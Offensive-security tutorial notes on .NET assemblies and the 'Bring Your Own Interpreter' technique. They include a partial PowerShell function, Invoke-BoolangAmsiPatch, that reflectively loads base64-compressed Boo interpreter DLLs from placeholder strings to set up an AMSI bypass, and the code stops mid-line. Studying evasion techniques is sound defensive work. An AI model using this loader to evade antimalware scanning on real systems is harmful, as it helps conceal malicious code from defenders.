### 1 - Introduction 

**What is .NET Assemblies :**

Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications. An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications. 
They provide the common language runtime with the information it needs to be aware of type implementations.



- .NET assemblies can be executed by any .NET langage
- The function `Assembly.Load()` will reflectively load .NET Assemblies

>⚠️  **.NET Format Assemblies ≠ C Format Assemblies**

### 2 - BYOI Concept

this technique which was discovered [byt3bl33d3r](https://github.com/byt3bl33d3r) consists in using third party parts of the languages present in .NET for embedding a interpreter into a default .NET langage

```boo
function Invoke-BoolangAmsiPatch {
    $BooLangDLL = @'<BOOLANG_DLL>'@
    $BooLangCompilerDLL = @'<BOOLANG_COMPILER_DLL>'@
    $BooLangParserDLL = @'<BOOLANG_PARSER_DLL>'@
    $BoolangExtensionsDLL = @'<BOOLANG_EXTENSION_DLL>'@

    function Load-Assembly($EncodedCompressedFile){
        $DeflatedStream = [IO.Compression.DeflateStream]::new([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile), [IO.Compression.CompressionMode]::Decompress)
        $UncompressedFileBytes = New-Object Byte[] (1900000)
        $DeflatedStream.Read($UncompressedFileBytes, 0, 1900000) | Out-Null
        return [Reflection.Assembly]::Load($UncompressedFileBytes)
    }
    $BooLangAsm = Load-Assembly($BooLangDLL)
    $BooLangCompilerAsm = Load-Assembly($BooLangCompilerDLL)
    $BooLangParserAsm = Load-Assembly($BooLangParserDLL)
    $
}
```
